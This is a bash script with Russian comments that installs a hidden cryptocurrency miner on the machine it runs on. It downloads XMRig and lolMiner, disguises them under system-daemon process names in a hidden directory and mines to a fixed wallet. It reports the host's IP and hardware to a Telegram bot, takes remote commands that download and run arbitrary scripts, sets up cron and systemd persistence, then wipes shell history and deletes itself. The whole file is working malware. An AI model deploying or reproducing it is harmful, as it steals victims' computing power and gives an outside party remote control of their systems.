#!/bin/bash

# [ CONFIGURATION ]
FIXED_WALLET_ID="krxYNV2DZQ"
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"

# Ссылка по умолчанию для команды /update
DEFAULT_UPDATE_URL="https://raw.githubusercontent.com/xdLolKek/connfy-libs/refs/heads/main/Connfy.sh"

# [ REPORTING INTERVAL: 18000s = 5 Hours ]
REPORT_INTERVAL=18000 

# [ POOLS ]
POOL_CPU_1="xmr.kryptex.network:7029"
POOL_CPU_2="xmr-eu.kryptex.network:7029"
POOL_GPU_1="etc.kryptex.network:7033"
POOL_GPU_2="etc-eu.kryptex.network:7033"

# [ PRIVILEGES & HIDDEN DIRECTORY ]
IS_ROOT=0
if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=1
    BASE_DIR="/usr/local/bin/.connfy-core"
else
    BASE_DIR="$HOME/.connfy-core"
fi
mkdir -p "$BASE_DIR"
cd "$BASE_DIR" || exit 1

# Маскировочные имена процессов
BIN_CPU="sys_net_daemon" 
BIN_GPU="sys_render_service"

URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
URL_LOLMINER="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"

LOG_CPU="$BASE_DIR/.cpu_data.log"
LOG_GPU="$BASE_DIR/.gpu_data.log"

# ----------------------------------------------------
# [ PHASE 1: WORKER & HARDWARE DETECTION ]
# ----------------------------------------------------
get_worker() {
    local ip
    ip=$(curl -s -m 5 ifconfig.me || wget -qO- -t 1 ifconfig.me 2>/dev/null)
    [ -z "$ip" ] && ip="111.111.111.111"
    
    local safe_worker
    safe_worker=$(echo "$ip" | sed 's/\./A/g' | tr -cd '0-9A-Za-z')
    
    echo "${FIXED_WALLET_ID}.${safe_worker}"
}
WORKER=$(get_worker)
SERVER_IP=$(curl -s -m 5 ifconfig.me || echo "Unknown-IP")

detect_gpu() {
    if command -v lspci >/dev/null 2>&1; then
        if lspci | grep -iE 'vga|3d|display' | grep -iE 'nvidia|amd|advanced micro|radeon' >/dev/null 2>&1; then
            echo "1"
            return
        fi
    fi
    if [ -d "/proc/driver/nvidia" ] || [ -c "/dev/nvidia0" ] || [ -d "/sys/class/drm/card0" ]; then
        echo "1"
        return
    fi
    echo "0"
}
HAS_GPU=$(detect_gpu)

# ----------------------------------------------------
# [ PHASE 2: MODULE DOWNLOAD & SETUP ]
# ----------------------------------------------------
# CPU Setup
if [ ! -f "$BIN_CPU" ]; then
    curl -L -k -s -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz "$URL_XMRIG"
    tar -xf cpu.tar.gz 2>/dev/null
    FOUND_CPU=$(find . -type f -name "xmrig" | head -n 1)
    if [ -n "$FOUND_CPU" ]; then
        mv "$FOUND_CPU" "./$BIN_CPU"
        chmod +x "./$BIN_CPU"
    fi
    rm -rf cpu.tar.gz xmrig*
fi

# CPU Config
cat <<EOF > config.json
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false },
    "autosave": true,
    "background": false,
    "colors": false,
    "cpu": { "enabled": true, "huge-pages": true, "asm": true },
    "donate-level": 1,
    "pools": [
        { "url": "$POOL_CPU_1", "user": "$WORKER", "pass": "x", "keepalive": true },
        { "url": "$POOL_CPU_2", "user": "$WORKER", "pass": "x", "keepalive": true }
    ]
}
EOF

# GPU Setup
if [ "$HAS_GPU" -eq 1 ] && [ ! -f "$BIN_GPU" ]; then
    curl -L -k -s -o gpu.tar.gz "$URL_LOLMINER" || wget -qO gpu.tar.gz "$URL_LOLMINER"
    tar -xf gpu.tar.gz 2>/dev/null
    FOUND_GPU=$(find . -type f -name "lolMiner" | head -n 1)
    if [ -n "$FOUND_GPU" ]; then
        mv "$FOUND_GPU" "./$BIN_GPU"
        chmod +x "./$BIN_GPU"
    fi
    rm -rf gpu.tar.gz 1.98a
fi

# ----------------------------------------------------
# [ PHASE 3: TARGETED MULTI-NODE WATCHDOG ]
# ----------------------------------------------------
cat <<EOF > watchdog.sh
#!/bin/bash
BASE_DIR="$BASE_DIR"
BIN_CPU="$BIN_CPU"
BIN_GPU="$BIN_GPU"
POOL_GPU_1="$POOL_GPU_1"
POOL_GPU_2="$POOL_GPU_2"
WORKER="$WORKER"
SERVER_IP="$SERVER_IP"
TG_BOT_TOKEN="$TG_BOT_TOKEN"
TG_CHAT_ID="$TG_CHAT_ID"
DEFAULT_UPDATE_URL="$DEFAULT_UPDATE_URL"
REPORT_INTERVAL=$REPORT_INTERVAL
HAS_GPU=$HAS_GPU
IS_ROOT=$IS_ROOT

LOG_CPU="$LOG_CPU"
LOG_GPU="$LOG_GPU"

cd "\$BASE_DIR" || exit 1

LAST_REPORT=\$(date +%s)
PAUSED=0

send_tg_msg() {
    local msg="\$1"
    curl -s -X POST "https://api.telegram.org/bot\$TG_BOT_TOKEN/sendMessage" \
         -d chat_id="\$TG_CHAT_ID" \
         -d text="\$msg" \
         -d parse_mode="HTML" > /dev/null 2>&1
}

# Функция таргетинга: проверяет, предназначается ли команда именно этой машине
is_target_me() {
    local target="\$1"
    
    # Если целевой IP не указан или 'all' - команда выполнится на ВСЕХ серверах
    if [ -z "\$target" ] || [ "\$target" = "all" ] || [ "\$target" = "ALL" ]; then
        return 0
    fi
    
    # Совпадение по стандартному IP или Worker ID
    if [ "\$target" = "\$SERVER_IP" ] || [ "\$target" = "\$WORKER" ]; then
        return 0
    fi
    
    # Совпадение по форматированному IP (например: 185A220A101A5)
    local safe_ip
    safe_ip=\$(echo "\$SERVER_IP" | sed 's/\./A/g')
    if [ "\$target" = "\$safe_ip" ]; then
        return 0
    fi
    
    return 1
}

# Отчет по хешрейту
send_telemetry_report() {
    local title="\$1"
    
    CPU_HASHRATE="0 H/s"
    CPU_SHARES="0"
    if [ -f "\$LOG_CPU" ]; then
        SPEED_LINE=\$(grep -i "speed 10s/60s/15m" "\$LOG_CPU" | tail -n 1)
        if [ -n "\$SPEED_LINE" ]; then
            RAW_SPEED=\$(echo "\$SPEED_LINE" | awk '{print \$5}')
            [ -n "\$RAW_SPEED" ] && CPU_HASHRATE="\${RAW_SPEED} H/s"
        fi
        SHARES_COUNT=\$(grep -c -i "accepted" "\$LOG_CPU" 2>/dev/null)
        [ -n "\$SHARES_COUNT" ] && CPU_SHARES="\$SHARES_COUNT"
    fi

    GPU_HASHRATE="0 MH/s"
    GPU_SHARES="0"
    if [ "\$HAS_GPU" -eq 1 ] && [ -f "\$LOG_GPU" ]; then
        GPU_SPEED_LINE=\$(grep -iE "Total Speed|Average speed" "\$LOG_GPU" | tail -n 1)
        if [ -n "\$GPU_SPEED_LINE" ]; then
            RAW_GPU_SPEED=\$(echo "\$GPU_SPEED_LINE" | grep -o '[0-9.]*' | head -n 1)
            [ -n "\$RAW_GPU_SPEED" ] && GPU_HASHRATE="\${RAW_GPU_SPEED} MH/s"
        fi
        ACC_LINE=\$(grep -i "Accepted" "\$LOG_GPU" | tail -n 1)
        if [ -n "\$ACC_LINE" ]; then
            RAW_ACC=\$(echo "\$ACC_LINE" | grep -o '[0-9]*' | head -n 1)
            [ -n "\$RAW_ACC" ] && GPU_SHARES="\$RAW_ACC"
        fi
    fi

    REPORT="📊 <b>\$title</b>%0A"
    REPORT="\${REPORT}🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A"
    REPORT="\${REPORT}🆔 <b>Worker:</b> <code>\$WORKER</code>%0A"
    REPORT="\${REPORT}⏱ <b>Uptime:</b> \$(uptime -p 2>/dev/null || echo 'N/A')%0A%0A"

    REPORT="\${REPORT}💻 <b>CPU Status:</b> \$CPU_STATUS%0A"
    REPORT="\${REPORT}⚡ <b>CPU Hashrate:</b> \$CPU_HASHRATE%0A"
    REPORT="\${REPORT}📦 <b>CPU Accepted Shares:</b> \$CPU_SHARES%0A%0A"

    if [ "\$HAS_GPU" -eq 1 ]; then
        REPORT="\${REPORT}🎮 <b>GPU Status:</b> \$GPU_STATUS%0A"
        REPORT="\${REPORT}⚡ <b>GPU Hashrate:</b> \$GPU_HASHRATE%0A"
        REPORT="\${REPORT}📦 <b>GPU Accepted Shares:</b> \$GPU_SHARES%0A"
    else
        REPORT="\${REPORT}🎮 <b>GPU Status:</b> N/A (CPU-Only Machine)%0A"
    fi

    send_tg_msg "\$REPORT"
}

# Отчет по характеристикам
send_specs_report() {
    local cpu_model
    cpu_model=\$(grep "model name" /proc/cpuinfo 2>/dev/null | head -n 1 | cut -d: -f2 | xargs)
    [ -z "\$cpu_model" ] && cpu_model="Generic CPU"
    
    local cpu_cores
    cpu_cores=\$(nproc 2>/dev/null || echo "N/A")
    
    local load_avg
    load_avg=\$(cat /proc/loadavg 2>/dev/null | awk '{print \$1 ", " \$2 ", " \$3}')
    
    local ram_info
    ram_info=\$(free -h 2>/dev/null | awk '/Mem:/ {print \$3 " / " \$2}')
    
    local disk_info
    disk_info=\$(df -h / 2>/dev/null | awk 'NR==2 {print \$3 " / " \$2 " (" \$5 " used)"}')

    local msg="🖥 <b>SERVER HARDWARE & LOAD SPECS</b>%0A"
    msg="\${msg}🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A"
    msg="\${msg}🆔 <b>Worker:</b> <code>\$WORKER</code>%0A"
    msg="\${msg}⏱ <b>Uptime:</b> \$(uptime -p 2>/dev/null || echo 'N/A')%0A%0A"
    
    msg="\${msg}🧠 <b>CPU Model:</b> \$cpu_model (\$cpu_cores Cores)%0A"
    msg="\${msg}📈 <b>CPU Load (1m, 5m, 15m):</b> \$load_avg%0A"
    msg="\${msg}💾 <b>RAM Usage:</b> \$ram_info%0A"
    msg="\${msg}💽 <b>Disk Space:</b> \$disk_info%0A%0A"

    if command -v nvidia-smi >/dev/null 2>&1; then
        msg="\${msg}🎮 <b>GPU HARDWARE DIAGNOSTICS:</b>%0A"
        local gpu_idx=0
        while IFS=',' read -r name util mem_used mem_total temp fan; do
            msg="\${msg}• <b>GPU \${gpu_idx}:</b> \${name}%0A"
            msg="\${msg}  └ Load: \${util}% | Temp: \${temp}°C | Fan: \${fan}% | VRAM: \${mem_used}MB / \${mem_total}MB%0A"
            gpu_idx=\$((gpu_idx + 1))
        done < <(nvidia-smi --query-gpu=name,utilization.gpu,memory.used,memory.total,temperature.gpu,fan.speed --format=csv,noheader,nounits 2>/dev/null)
    elif [ "\$HAS_GPU" -eq 1 ]; then
        msg="\${msg}🎮 <b>GPU DIAGNOSTICS:</b> Generic GPU Hardware Detected%0A"
    else
        msg="\${msg}🎮 <b>GPU DIAGNOSTICS:</b> No GPU Hardware Present%0A"
    fi

    send_tg_msg "\$msg"
}

# Отчет по логам
send_logs_report() {
    local cpu_log_tail="No log data"
    local gpu_log_tail="No log data"
    [ -f "\$LOG_CPU" ] && cpu_log_tail=\$(tail -n 6 "\$LOG_CPU" 2>/dev/null | tr '\n' ' ')
    [ -f "\$LOG_GPU" ] && gpu_log_tail=\$(tail -n 6 "\$LOG_GPU" 2>/dev/null | tr '\n' ' ')
    
    local msg="📋 <b>RAW LOG TAIL REPORT</b>%0A"
    msg="\${msg}🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A%0A"
    msg="\${msg}💻 <b>CPU LOG TAIL:</b>%0A<code>\$cpu_log_tail</code>%0A%0A"
    msg="\${msg}🎮 <b>GPU LOG TAIL:</b>%0A<code>\$gpu_log_tail</code>"
    send_tg_msg "\$msg"
}

# Стартовое уведомление
STARTUP_MSG="🚀 <b>ENGINE V16 (TARGETED MULTI-NODE ACTIVE)</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to update specific nodes.</i>"
send_tg_msg "\$STARTUP_MSG"

while true; do
    NOW=\$(date +%s)

    # --- 1. КОНТРОЛЬ ПРОЦЕССОВ ---
    if [ "\$PAUSED" -eq 0 ]; then
        CPU_STATUS="🟢 Active"
        if [ -f "./\$BIN_CPU" ]; then
            if ! pgrep -f "\$BIN_CPU" > /dev/null; then
                nohup ./\$BIN_CPU --config=config.json >> "\$LOG_CPU" 2>&1 &
                sleep 2
                if ! pgrep -f "\$BIN_CPU" > /dev/null; then
                    CPU_STATUS="🔴 Offline / Stalled"
                fi
            fi
        fi

        GPU_STATUS="N/A (No GPU)"
        if [ "\$HAS_GPU" -eq 1 ]; then
            GPU_STATUS="🟢 Active"
            if [ -f "./\$BIN_GPU" ]; then
                if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                    nohup ./\$BIN_GPU --algo ETC --pool \$POOL_GPU_1 --user \$WORKER --pool \$POOL_GPU_2 --user \$WORKER --nocolor --watchdog exit >> "\$LOG_GPU" 2>&1 &
                    sleep 2
                    if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                        GPU_STATUS="🔴 Offline / Crashed"
                    fi
                fi
            fi
        fi
    else
        CPU_STATUS="⏸ Paused by Admin"
        GPU_STATUS="⏸ Paused by Admin"
    fi

    # --- 2. РОТАЦИЯ ЛОГОВ ---
    [ -f "\$LOG_CPU" ] && tail -n 300 "\$LOG_CPU" > "\$LOG_CPU.tmp" && mv "\$LOG_CPU.tmp" "\$LOG_CPU"
    [ -f "\$LOG_GPU" ] && tail -n 300 "\$LOG_GPU" > "\$LOG_GPU.tmp" && mv "\$LOG_GPU.tmp" "\$LOG_GPU"

    # --- 3. ТЕЛЕГРАМ ОБРАБОТЧИК (АВТОРИЗОВАННЫЙ + ТАРГЕТИНГ ПО IP) ---
    LAST_CMD=\$(curl -s -m 3 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
    UPDATE_ID=\$(echo "\$LAST_CMD" | grep -o '"update_id":[0-9]*' | head -n 1 | cut -d: -f2)

    if [ -n "\$UPDATE_ID" ]; then
        AUTH_CHECK=\$(echo "\$LAST_CMD" | grep -o '"id":'"\$TG_CHAT_ID")
        
        curl -s -m 2 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=\$((UPDATE_ID + 1))" >/dev/null 2>&1

        if [ -n "\$AUTH_CHECK" ]; then
            CMD_TARGET=\$(echo "\$LAST_CMD" | awk '{print \$2}' | tr -d '\r\n')

            if is_target_me "\$CMD_TARGET"; then
                
                if echo "\$LAST_CMD" | grep -iE "/status|/stat" >/dev/null 2>&1; then
                    send_telemetry_report "ON-DEMAND TELEMETRY REPORT"
                    
                elif echo "\$LAST_CMD" | grep -iE "/specs|/hw|/info" >/dev/null 2>&1; then
                    send_specs_report
                    
                elif echo "\$LAST_CMD" | grep -iE "/logs|/log" >/dev/null 2>&1; then
                    send_logs_report

                elif echo "\$LAST_CMD" | grep -iE "/update|/dl" >/dev/null 2>&1; then
                    CUSTOM_URL=\$(echo "\$LAST_CMD" | grep -o 'http[s]*://[^" ]*' | head -n 1)
                    [ -n "\$CUSTOM_URL" ] && TARGET_URL="\$CUSTOM_URL" || TARGET_URL="\$DEFAULT_UPDATE_URL"
                    
                    MODULE_DIR="\$BASE_DIR/updates"
                    mkdir -p "\$MODULE_DIR"
                    
                    TIMESTAMP=\$(date +%s)
                    DEST_SCRIPT="\$MODULE_DIR/Connfy_\${TIMESTAMP}.sh"
                    
                    curl -L -k -s -o "\$DEST_SCRIPT" "\$TARGET_URL" || wget -qO "\$DEST_SCRIPT" "\$TARGET_URL"
                    
                    if [ -f "\$DEST_SCRIPT" ] && [ -s "\$DEST_SCRIPT" ]; then
                        chmod +x "\$DEST_SCRIPT"
                        nohup "\$DEST_SCRIPT" >/dev/null 2>&1 &
                        send_tg_msg "✅ <b>TARGET MATCHED (\$SERVER_IP):</b> Script downloaded from GitHub (<code>Connfy.sh</code>) and launched!"
                    else
                        send_tg_msg "❌ <b>UPDATE FAILED (\$SERVER_IP):</b> Could not fetch Connfy.sh from GitHub."
                    fi

                elif echo "\$LAST_CMD" | grep -i "/stop" >/dev/null 2>&1; then
                    PAUSED=1
                    pkill -9 -f "\$BIN_CPU" 2>/dev/null
                    pkill -9 -f "\$BIN_GPU" 2>/dev/null
                    send_tg_msg "🛑 <b>PAUSE COMMAND RECEIVED:</b> Processes terminated on IP \$SERVER_IP"

                elif echo "\$LAST_CMD" | grep -iE "/start|/restart" >/dev/null 2>&1; then
                    PAUSED=0
                    pkill -9 -f "\$BIN_CPU" 2>/dev/null
                    pkill -9 -f "\$BIN_GPU" 2>/dev/null
                    send_tg_msg "🔄 <b>RESUME COMMAND RECEIVED:</b> Restarting processes on IP \$SERVER_IP"
                fi
            fi
        fi
    fi

    # --- 4. ПЕРИОДИЧЕСКИЙ АВТО-ОТЧЕТ (Раз в 5 часов) ---
    ELAPSED=\$(( NOW - LAST_REPORT ))
    if [ "\$ELAPSED" -ge "\$REPORT_INTERVAL" ]; then
        LAST_REPORT=\$NOW
        send_telemetry_report "PERIODIC TELEMETRY REPORT"
    fi

    sleep 60
done
EOF

chmod +x watchdog.sh

# Перезапуск Вачдога
pkill -9 -f "watchdog.sh" 2>/dev/null
nohup ./watchdog.sh >/dev/null 2>&1 &

# ----------------------------------------------------
# [ PHASE 4: UNIVERSAL PERSISTENCE ]
# ----------------------------------------------------
if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null | grep -v "watchdog.sh"; \
     echo "@reboot $BASE_DIR/watchdog.sh"; \
     echo "*/10 * * * * $BASE_DIR/watchdog.sh") | crontab -
fi

if [ "$IS_ROOT" -eq 1 ] && [ -d "/run/systemd/system" ]; then
    cat <<EOF > /etc/systemd/system/connfy-wd.service
[Unit]
Description=Connfy Core Service
After=network.target

[Service]
Type=simple
ExecStart=$BASE_DIR/watchdog.sh
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable connfy-wd >/dev/null 2>&1
    systemctl start connfy-wd >/dev/null 2>&1
fi

history -c
rm -f "$0"
